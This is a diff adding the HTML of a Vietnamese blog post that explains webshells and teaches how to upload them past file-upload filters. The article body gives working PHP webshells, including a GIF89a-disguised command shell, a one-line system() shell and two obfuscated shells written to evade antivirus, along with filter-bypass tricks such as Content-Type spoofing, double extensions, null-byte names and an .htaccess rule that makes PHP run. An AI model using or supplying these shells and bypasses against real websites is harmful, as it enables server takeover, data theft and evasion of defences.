@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.65.2 with theme Tranquilpeak 0.4.7-BETA">
+<meta name="author" content="Nguyễn Mạnh">
+<meta name="keywords" content=", development, cyber security">
+<meta name="description" content="WebShell là 1 dạng mã độc, cửa hậu có nhiều chức năng để hỗ trợ các hacker chiếm quyền quản lý các hệ thống website.WebShell thường được viết bằng nhiều loại ngôn ngữ và thường thì chính là ngôn ngữ mà website đó đang sử dụng. Chức năng cơ bản là tải tệp tin lên máy chủ, kết nối đến cơ sở dữ liệu, vượt qua các cơ chế bảo mật, cấu hình, tấn công bruteforce, Get Root, Local Attack… chỉ cần hacker có thể tải được các tệp tin webshell này lên hệ thống của website thì xem như hacker đã có toàn quyền kiểm soát website đó, cho dù không biết tài khoản và mật khẩu của máy chủ này là gì.">
+
+
+<meta property="og:description" content="WebShell là 1 dạng mã độc, cửa hậu có nhiều chức năng để hỗ trợ các hacker chiếm quyền quản lý các hệ thống website.WebShell thường được viết bằng nhiều loại ngôn ngữ và thường thì chính là ngôn ngữ mà website đó đang sử dụng. Chức năng cơ bản là tải tệp tin lên máy chủ, kết nối đến cơ sở dữ liệu, vượt qua các cơ chế bảo mật, cấu hình, tấn công bruteforce, Get Root, Local Attack… chỉ cần hacker có thể tải được các tệp tin webshell này lên hệ thống của website thì xem như hacker đã có toàn quyền kiểm soát website đó, cho dù không biết tài khoản và mật khẩu của máy chủ này là gì.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webshell là gì? Làm thể nào để upload/sử dụng một webshell?">
+<meta name="twitter:title" content="Webshell là gì? Làm thể nào để upload/sử dụng một webshell?">
+<meta property="og:url" content="https://manhnv.com/2019/06/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/">
+<meta property="twitter:url" content="https://manhnv.com/2019/06/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/">
+<meta property="og:site_name" content="Chia sẻ là niềm vui">
+<meta property="og:description" content="WebShell là 1 dạng mã độc, cửa hậu có nhiều chức năng để hỗ trợ các hacker chiếm quyền quản lý các hệ thống website.WebShell thường được viết bằng nhiều loại ngôn ngữ và thường thì chính là ngôn ngữ mà website đó đang sử dụng. Chức năng cơ bản là tải tệp tin lên máy chủ, kết nối đến cơ sở dữ liệu, vượt qua các cơ chế bảo mật, cấu hình, tấn công bruteforce, Get Root, Local Attack… chỉ cần hacker có thể tải được các tệp tin webshell này lên hệ thống của website thì xem như hacker đã có toàn quyền kiểm soát website đó, cho dù không biết tài khoản và mật khẩu của máy chủ này là gì.">
+<meta name="twitter:description" content="WebShell là 1 dạng mã độc, cửa hậu có nhiều chức năng để hỗ trợ các hacker chiếm quyền quản lý các hệ thống website.WebShell thường được viết bằng nhiều loại ngôn ngữ và thường thì chính là ngôn ngữ mà website đó đang sử dụng. Chức năng cơ bản là tải tệp tin lên máy chủ, kết nối đến cơ sở dữ liệu, vượt qua các cơ chế bảo mật, cấu hình, tấn công bruteforce, Get Root, Local Attack… chỉ cần hacker có thể tải được các tệp tin webshell này lên hệ thống của website thì xem như hacker đã có toàn quyền kiểm soát website đó, cho dù không biết tài khoản và mật khẩu của máy chủ này là gì.">
+<meta property="og:locale" content="vi">
+
+  
+    <meta property="article:published_time" content="2019-06-18T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2019-06-18T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="Pentest web">
+    
+  
+  
+    
+      <meta property="article:tag" content="webshell">
+    
+      <meta property="article:tag" content="pentest web">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/images/posts/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/what-is-webshell.jpg">
+  <meta property="twitter:image" content="https://manhnv.com/images/posts/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/what-is-webshell.jpg">
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/images/about/nguyenmanh.jpg">
+  <meta property="twitter:image" content="https://manhnv.com/images/about/nguyenmanh.jpg">
+
+
+    <title>Webshell là gì? Làm thể nào để upload/sử dụng một webshell?</title>
+
+    <link rel="icon" href="https://manhnv.com/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://manhnv.com/2019/06/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://manhnv.com/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://manhnv.com/">Chia sẻ là niềm vui</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://manhnv.com/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://manhnv.com/images/about/nguyenmanh.jpg" alt="Ảnh đại diện" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://manhnv.com/#about">
+          <img class="sidebar-profile-picture" src="https://manhnv.com/images/about/nguyenmanh.jpg" alt="Ảnh đại diện" />
+        </a>
+        <h4 class="sidebar-profile-name">Nguyễn Mạnh</h4>
+        
+          <h5 class="sidebar-profile-bio">Chia sẻ là niềm vui</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Trang chủ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Danh mục</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Thẻ thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Lưu trữ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">Thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://manhnv.com/copyrights">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-copyright"></i>
+      
+      <span class="sidebar-button-desc">Copyrights</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/nguyenmanh1997" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://facebook.com/nguyenmanh1997" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-facebook"></i>
+      
+      <span class="sidebar-button-desc">Facebook</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.youtube.com/channel/UCEY3DBfSDupbSG96jfcSDwQ?sub_confirmation=1" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-youtube"></i>
+      
+      <span class="sidebar-button-desc">Youtube</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="5"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      Webshell là gì? Làm thể nào để upload/sử dụng một webshell?
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2019-06-18T00:00:00Z">
+        
+  tháng 6 18, 2019
+
+      </time>
+    
+    
+  
+  
+    <span>mục</span>
+    
+      <a class="category-link" href="https://manhnv.com/categories/pentest-web">Pentest web</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p><code>WebShell là 1 dạng mã độc, cửa hậu có nhiều chức năng để hỗ trợ các hacker chiếm quyền quản lý các hệ thống website.WebShell thường được viết bằng nhiều loại ngôn ngữ và thường thì chính là ngôn ngữ mà website đó đang sử dụng. Chức năng cơ bản là tải tệp tin lên máy chủ, kết nối đến cơ sở dữ liệu, vượt qua các cơ chế bảo mật, cấu hình, tấn công bruteforce, Get Root, Local Attack… chỉ cần hacker có thể tải được các tệp tin webshell này lên hệ thống của website thì xem như hacker đã có toàn quyền kiểm soát website đó, cho dù không biết tài khoản và mật khẩu của máy chủ này là gì.</code></p>
+<h2 id="webshell-là-gì">Webshell là gì?</h2>
+<p>Một webshell là một script có thể được tải lên một web server cho phép điều khiển và quản lý từ xa. Các web servers bị nhiễm độc (bị hacker tải webshell lên) có thể là mạng internet hoặc mạng nội bộ, nơi mà các web shells được sử dụng để đi sâu hơn vào các máy chủ(host) nội bộ.</p>
+<p>Một web shell có thể được viết bằng một ngôn ngữ bất kỹ nào mà web servers đích hỗ trợ. Các web shell phổ biến nhất được viết bằng những ngôn ngữ cũng phổ biết không kém, ví dụ: PHP, ASP, Perl, Ruby, Python và Unix shell script&hellip;</p>
+<p>Sử dụng các công cụ thăm dò mạng, hacker có thể xác định xác lỗ hổng có thể tấn công được và tiến hành cài đặt web shell. Ví dụ: Những lỗ hổng này có thể tồn tại trong các hệ thống quản lý nội dung(CMS) hoặc phần mềm web server.</p>
+<p>Sau khi đã tải lên thành công, hacker có thể sử dụng web shell để tận dụng các kỹ thuật khai thác khác nhằm nâng cao đặc quyền và ra lệnh từ xa. Các lệnh này liên quan trực tiếp đến các các đặc quyền và chức năng sẵn có của web server, các lệnh đồng thời bao gồm khả năng: thêm, sửa, xóa và thực thi các files cũng như các khả năng chạy các shell commands, các tệp thực thi, scripts.</p>
+<h2 id="làm-thể-nào-để-tải-lên-và-sử-dụng-một-webshell">Làm thể nào để tải lên và sử dụng một webshell?</h2>
+<p>Kẻ tấn công có thể lợi dụng các lỗ hổng phổ biến để tải webshell lên như:</p>
+<ul>
+<li>Cross-site Scripting.</li>
+<li>SQL injection.</li>
+<li>Lỗ hổng trong các ứng dụng/dịch vụ (ví dụ: wordpress hoặc các ứng cụng CMS khác).</li>
+<li>Lỗ hổng xử lý tệp (ví dụ: lọc tải lên hoặc những quyền được chỉ định)</li>
+<li>Lỗ hổng về Remote File Include (RFI) và Local File Include (LFI)</li>
+<li>Giao diện admin bị lộ (có thể là các khu vực có thể tìm thấy các lỗ hổng được đề cập ở trên).</li>
+</ul>
+<h2 id="web-shells-được-sử-dụng-cho-các-mục-đích-như">Web shells được sử dụng cho các mục đích như:</h2>
+<ul>
+<li>Thu thập và lọc dữ liệu nhạy cảm, các thông tin quan trọng.</li>
+<li>Tải lên các phần mềm độc hại, VD: Một lỗ hổng có khả năng lây lan và scan các nạn nhân tiếp theo.</li>
+<li>Đóng vai trò như một điểm tự để tạo ra các lệnh cho các hosts trong mạng mà không cần phải truy cập internet trực tiếp.</li>
+<li>Có chức năng như một cơ sở hạ tầng điều khiển và kiểm soát, có khả năng như một bot trong một mạng botnet.</li>
+<li>Mặc dù webshell thường không được sử dụng cho các cuộc tấn công DoS, nhưng nó vẫn có thể hoạt động như một platform để tải lên các công cụ khác, bao gồm cả DoS.</li>
+</ul>
+<h2 id="how-would-you-bypass-uploader-protections">How would you bypass uploader protections?</h2>
+<p>Thường thì các trang web sẽ có chức năng <code>upload file</code>, VD: Là một file ảnh để cập nhật ảnh đại diện. Kẻ tấn công có thể lợi dụng tính năng này để tải shell lên hệ thống. Nhưng các shell tải lên thường bị cản trở bởi một số filters để ngăn chặn khả năng tải lên các tệp độc hại, VD: tải ảnh đại diện thì chỉ cho tải các file có đuôi là <code>.png, .jpg, .jpeg ...</code>.</p>
+<p>Vì vậy, để tải lên được file như ý thì chúng ta phải vượt qua được các bộ lọc (filters) đó. Và sau đây là các để bypass.</p>
+<p>Chúng ta có một số bộ lọc cần vượt quá (Bypass):</p>
+<ol>
+<li>Client side filters</li>
+<li>Content/type Verification</li>
+<li>The extention Black listing</li>
+<li>The Extention White listing</li>
+<li>The Content length and Malicious script checks</li>
+<li>Upload Shell using SQLi</li>
+<li>Shell Upload Bypass using LFI</li>
+</ol>
+<h3 id="1-client-side-filters-bypass">1. Client side filters bypass</h3>
+<p>Trước tiên chúng ta phải biết &ldquo;Client side filters&rdquo; là gì?</p>
+<p><code>Client side filters</code> là các bộ lọc dựa trên trình duyệt hoặc là javascript để xác thực loại tệp được tải lên. Nếu tập tin tải lên không hợp lệ thì sẽ có thông báo lỗi. Tất cả mọi thứ có vẻ hoạt động tốt cho đến khi kẻ tấn công có thể giả mạo yêu cầu trước khi gửi lên máy chủ. Dưới đây là một số thủ thuật để vượt qua <code>Client side filters</code>.</p>
+<ol>
+<li>Tắt javascript của trình duyệt (Disable JavaScript in the browser).</li>
+<li>HTTP Live Headers to replay the tampered request.</li>
+<li>Giả mạo dữ liệu bằng cách sử dụng <code>firefox addon</code>.</li>
+<li>Proxify the application and tamper the request.</li>
+</ol>
+<p>Vì tất cả cách trên đều là cách bypass và một trong số cách đó sẽ phù hợp với kịch bản và trường hợp bạn cần sử dụng, trong bài này mình sử dụng phương pháp cuối cùng <code>Proxify the application and tamper the request</code>. Nó thiết lập proxy BURP thực sự đơn giản với trình duyệt của bạn và bắt đầu. Tôi sẽ chỉ cho các bạn các bước cơ bản để sử dụng BURP.</p>
+<p><strong>Bước 1</strong>: Mở Burp proxy và tạo cho nó lắng nghe cổng 8080:</p>
+<p><img src="https://manhnv.com/images/posts/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/burp_img_listner.png?raw=true" alt="step 1" title="step 1"></p>
+<p><strong>Bước 2</strong>: Cấu hình Firefox của bạn để gửi traffic qua cổng localhost:8080, <code>Tools -&gt; Options -&gt; Advanced -&gt; Network -&gt; Settings make the changes shown in the image</code></p>
+<p>Bạn đã chuyển hướng thành công traffic truy cập thông qua BURP. Bây giờ chọn tab Proxy -&gt; tab Intercept và bật ON Intercept lên nếu nó đang tắt, để bạn có thể thay đổi nội dung request trước khi đến máy chủ.</p>
+<p><img src="https://manhnv.com/images/posts/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/burp_interception.png?raw=true" alt="step 3" title="step 3"></p>
+<p>Bây giờ giả sử có một trang web mà bạn đang cố tải shell và nó hiển thị lỗi răng bạn chỉ có thể tải lên tệp hình ảnh, chỉ cần đổi tên shell.php của bạn thành shell.php.jpg và tải tệp lên. Khi bạn nhấp vào gửi một yêu cầu sẽ đến BURP. Thay đổi tên tệp trở lại thành shell.php nếu không có kiểm tra phía máy chủ thì bạn sẽ tải được shell của mình lên.</p>
+<h3 id="2-bypass-contenttype-verification">2. Bypass Content/type Verification</h3>
+<ol>
+<li>Chỉnh sửa Content-Type bằng các sử dụng Request Modification.</li>
+<li>Kiểm tra phía máy chủ bằng GIF89a; header.</li>
+<li>Tiêm payload của bạn vào Image Metadata/Comment.</li>
+</ol>
+<p><strong>Change Content-Type using Request Modification</strong></p>
+<p>Nhiều nhà phát triển dự vào request &ldquo;content-type&rdquo;, tệp tải lên sẽ kiểm tra content-type và nếu là kiểu Image thì mới được tải lên. Vấn đề ở đây là biến Content-type có thể được thay đổi trước khi đến server. Như bạn có thể thấy trong Image, conten-type là <code>application/octet-stream</code>, thay đổi nó thành <code>image/gif</code> và chờ đợi kết quả.</p>
+<p><img src="https://manhnv.com/images/posts/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/content_type1.png?raw=true" alt="content-type" title="content-type"></p>
+<p><strong>Fool Server side check using GIF89a; header</strong></p>
+<p>Đôi khi kiểm tra chữ ký nội dung phía máy chủ có thể bị đánh lừa bằng cách sử dụng <code>GIF89a;</code> trong header tệp shell của bạn. Và đây là một ví dụ:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">GIF89a;
+<span style="color:#75715e">&lt;?</span>
+<span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);<span style="color:#75715e">//or you can insert your complete shell code
+</span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span>
+</code></pre></div><p><strong>Inject your payload in Image Metadata/Comments</strong></p>
+<p>Có rất nhiều cách hack mà chúng ta có thể thực hiện với tệp hình ảnh, một trong số chúng là đứa payload và <code>metadata header</code> bằng <code>exiftools</code> hoặc bạn có thể sử dụng một công cụ có tên <code>edjpgcom.exe</code>. Sử dụng dòng lệnh <code>edjpgcom.exe yourimagefilename.jpg</code> để thêm comments cho hình ảnh của bạn.</p>
+<h3 id="3-bypassing-the-extension-black-listing">3. Bypassing the Extension Black Listing</h3>
+<p>Đôi khi các nhà phát triể sử dụng phương pháp liệt kê danh sách đen chống lại việc tải shell lên, vấn đề với việc duyệt danh sách đen luôn giống nhau, và nhiều khi bạn có thể bỏ sót mà quên chặn đi một cái gì đó thì kẻ tấn công có thể bypass ngay. Giả sử các nhà phát triển đang lọc các tệp php không được tải lên server. Tôi sẽ hướng dẫn cho các bạn một số các để bypass nó.</p>
+<ol>
+<li>Hãy thử các đuôi file (extentions) khác.</li>
+<li>Vượt qua một số bộ lọc của các trường hợp nhạy cảm.</li>
+<li>Vượt qua bộ lọc regex.</li>
+<li>Thêm shell để thực thi bằng cách sử dụng tệp .htaccess.</li>
+</ol>
+<p><strong>Try other executable extensions</strong></p>
+<p>Nếu file có đuôi là <code>php</code> thì tôi có thể đổi tên tệp thành <code>shell.php1, shell.php2, shell.php3, shell.phptml, ...</code>. Chúng tôi thậm chí có thể thực thi perl shell với phần mở rộng là <code>.pl hoặc .cgi</code>.</p>
+<p><strong>Bypass Case Sensitive Filter</strong></p>
+<p>Nếu tất cả đều nằm trong danh sách đen, chúng ta có thể thử thay đổi trường hợp để xem bộ lọc có phân biệt chữ hoa hay không, hãy thử:</p>
+<pre><code>shell.PhP
+shell.Php1
+shell.PhP2
+shell.pHP2
+shell.pHp4
+shell.PHp5
+shell.PhtMl
+</code></pre><p><strong>Idiotic Regex filter bypass</strong></p>
+<p>Lập trình viên có thể tạo một regex chỉ kiểm tra sự <code>.jpg</code> trong tên tệp, vì vậy những trường hợp như vậy có thể bypass bằng cách sử dụng hai lần mở rộng như <code>shell.jpg.php</code>, v.v</p>
+<p><strong>Add shell to executable using .htaccess file</strong></p>
+<p>Nhưng nếu tôi không may mắn và tất cả các phần mở rộng ở trên không hoạt động thì tôi vẫn có một cách nữa để truy cập trang web bằng tệp <code>.htaccess</code>.</p>
+<p>Tệp htaccess la tệp cấu hình máy chủ Apache. Sử dụng một trong các cài đặt của nó, chúng ta có thể thay đổi hành vi loại tệp. Bây giờ, hãy tải file .htaccess lên cùng thư mục.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.htaccess" data-lang=".htaccess">AddType application/x-httpd-php .shell
+</code></pre></div><h3 id="4-bypassing-the-extension-white-listing">4. Bypassing the Extension White Listing</h3>
+<p>Đôi khi nhà phát triển không cho phép bất kỳ tiện ích mở rộng nào khác ngoài một số tiện ích mở rộng được liệt kê trong white list, chảng hạn như cho phép tải lên những file hình ảnh có đuôi là <code> jpg,jpeg,gif,png,bmp...</code>. Chúng ta có thể thử các thủ thuật sau:</p>
+<ol>
+<li>Null Byte Injection</li>
+<li>Bypass using Double Extension</li>
+<li>Invalid Extension Bypass</li>
+</ol>
+<p><strong>Null Byte Injection</strong></p>
+<p>Thủ thuật đầu tiên tôi muốn nhắc tới là <code>tiêm NULL byte</code>, khi tôi chèn một tệp <code>shell.php% 00.jpg</code> phần sau %00 bị vô hiệu hóa bởi ngôn ngữ và tệp được tải lên với tên shell.php.</p>
+<p><strong>Bypass using Double Extension</strong></p>
+<p>Trong một số trường hợp, chúng ta có thể sử dụng shell.php.jpg, shell.php:.jpg, shell.php;.jpg, đôi khi điều này cũng có thể làm cho shell thực thi nhưng thường bị bypass bởi máy chủ web hoặc hệ điều hành. Vì vậy, không thể đổ lỗi cho lập trình viên, nhưng khi tải tập tin lên mà không thay đổi tên tập tin là một điều không chấp nhận được.</p>
+<p><strong>Invalid Extension Bypass</strong></p>
+<p>Đây là một khai thác phía máy chủ khác, tôi sử dụng các mực độ như .test thì hệ điều hành không nhận ra, thì phần mở rộng đầu tiên được sử dụng. Tức là tôi thử tải lên tệp shell.php.test thì hệ điều hành bỏ qua phần mở rộng .test và thực thi .php.</p>
+<h3 id="5-bypassing-the-content-length-and-malicious-script-checks">5. Bypassing the Content Length and Malicious script checks</h3>
+<p><strong>Content Length Bypass</strong></p>
+<p>Đôi khi chúng ta sẽ gặp một số ứng dụng kiểm tra độ dài của nội dung tệp tải lên. Hãy nhớ ràng có một số cách rất dễ dàng để vượt qua cách kiểm tra như vậy. Nếu máy chủ đang kiểm tra đầu vào tệp rất nhỏ thì đây là mã shell nhỏ bạn có thể sử dụng:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#a6e22e">system</span>($_GET[<span style="color:#ae81ff">0</span>]);
+</code></pre></div><p>Bây giờ nếu kiểm tra kích thước tệp lớn hơn, chúng ta có thể làm cho tệp có nội dung lớn hơn bằng cách chèn rất nhiều rác vào tệp của mình:</p>
+<p><strong>Malicious script checks Bypass</strong></p>
+<p>Nhiều lần tôi có tải thành công một shell lên một máy chủ nhưng khi tôi quay lại cố truy cập nó, thì phát hiện shell của mình đã bị xóa. Thường thì một số AV (anti virus) hoặc các tệp lệnh độc hại và xóa. bây giờ chúng ta có thể đối phó với nó một cách dễ dàng nhưng tôi đang viết bài này cho những người không biết xử lý vấn đề như thế này. Vì vậy, ở đây chúng ta cần một số kiến thức cơ bản về mã hóa hoặc là biết cách copy/patse. ở đây tôi sử dụng một số tệp lệnh shell hoặc động trong các tình huống như vậy:</p>
+<p><code>Shell-1</code>: Bạn có thể thực thi nó như <code>shell.php?0=system&amp;1=ls</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&lt;?
+@$_<span style="color:#f92672">[]=</span>@! _; $__<span style="color:#f92672">=</span>@<span style="color:#e6db74">${</span>_<span style="color:#e6db74">}</span>&gt;&gt;$_;$_<span style="color:#f92672">[]=</span>$__;$_<span style="color:#f92672">[]=</span>@_;$_<span style="color:#f92672">[((</span>  $__<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>$__   <span style="color:#f92672">))]</span>.<span style="color:#f92672">=</span>$_;
+$_<span style="color:#f92672">[]=</span>  $__; $_<span style="color:#f92672">[]=</span>$_<span style="color:#f92672">[</span>--$__<span style="color:#f92672">][</span>$__&gt;&gt;$__<span style="color:#f92672">]</span>;$_<span style="color:#f92672">[</span>$__<span style="color:#f92672">]</span>.<span style="color:#f92672">=((</span>$__ $__<span style="color:#f92672">)</span>  $_<span style="color:#f92672">[</span>$__-$__<span style="color:#f92672">])</span>.<span style="color:#f92672">(</span>$__ $__ $__<span style="color:#f92672">)</span> $_<span style="color:#f92672">[</span>$__-$__<span style="color:#f92672">]</span>;
+$_<span style="color:#f92672">[</span>$__ $__<span style="color:#f92672">]</span> <span style="color:#f92672">=(</span>$_<span style="color:#f92672">[</span>$__<span style="color:#f92672">][</span>$__&gt;&gt;$__<span style="color:#f92672">])</span>.<span style="color:#f92672">(</span>$_<span style="color:#f92672">[</span>$__<span style="color:#f92672">][</span>$__<span style="color:#f92672">]</span>^$_<span style="color:#f92672">[</span>$__<span style="color:#f92672">][(</span>$__&lt;&lt;$__<span style="color:#f92672">)</span>-$__<span style="color:#f92672">]</span> <span style="color:#f92672">)</span>;
+$_<span style="color:#f92672">[</span>$__ $__<span style="color:#f92672">]</span> .<span style="color:#f92672">=(</span>$_<span style="color:#f92672">[</span>$__<span style="color:#f92672">][(</span>$__&lt;&lt;$__<span style="color:#f92672">)</span>-<span style="color:#f92672">(</span>$__/$__<span style="color:#f92672">)])</span>^<span style="color:#f92672">(</span>$_<span style="color:#f92672">[</span>$__<span style="color:#f92672">][</span>$__<span style="color:#f92672">]</span> <span style="color:#f92672">)</span>;
+$_<span style="color:#f92672">[</span>$__ $__<span style="color:#f92672">]</span> .<span style="color:#f92672">=(</span>$_<span style="color:#f92672">[</span>$__<span style="color:#f92672">][</span>$__ $__<span style="color:#f92672">])</span>^$_<span style="color:#f92672">[</span>$__<span style="color:#f92672">][(</span>$__&lt;&lt;$__<span style="color:#f92672">)</span>-$__ <span style="color:#f92672">]</span>;
+$_<span style="color:#f92672">=</span>$ 
+$_<span style="color:#f92672">[</span>$__  $__<span style="color:#f92672">]</span> ;$_<span style="color:#f92672">[</span>@-_<span style="color:#f92672">](</span>$_<span style="color:#f92672">[</span>@! _<span style="color:#f92672">]</span> <span style="color:#f92672">)</span>;
+?&gt;
+</code></pre></div><p><code>Shell-2</code>: Sẽ thực thi như <code>shell.php?_=system&amp;__=ls</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&lt;?php
+$_<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{&#34;</span>; 
+$_<span style="color:#f92672">=(</span>$_^<span style="color:#e6db74">&#34;&lt;&#34;</span><span style="color:#f92672">)</span>.<span style="color:#f92672">(</span>$_^<span style="color:#e6db74">&#34;&gt;;&#34;</span><span style="color:#f92672">)</span>.<span style="color:#f92672">(</span>$_^<span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span>;
+?&gt;
+&lt;?<span style="color:#f92672">=</span><span style="color:#e6db74">${</span><span style="color:#e6db74">&#39;_&#39;</span>.$_<span style="color:#e6db74">}</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">](</span><span style="color:#e6db74">${</span><span style="color:#e6db74">&#39;_&#39;</span>.$_<span style="color:#e6db74">}</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;__&#34;</span><span style="color:#f92672">])</span>;?&gt;
+</code></pre></div><p>Thậm chí có thể tải lên các đoạn mã php của riêng mình và thực hiện một số thao tác cơ bản.</p>
+<p>TRÊN ĐÂY LÀ TOÀN BỘ BÀI HƯỚNG DẪN, HI VỌNG CÓ THỂ GIÚP ÍCH ĐƯỢC CHO BẠN PHẦN NÀO!</p>
+<p>Tham khảo: <a href="http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html#cententtype-varification-bypass">http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html#cententtype-varification-bypass</a></p>
+
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">THẺ ĐÁNH DẤU</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/webshell/">webshell</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/pentest-web/">pentest web</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2019/06/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/" data-tooltip="CSRF (cross site request forgery) là gì? Làm thế nào để ngăn chặn tấn công CSRF?">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+                </a>
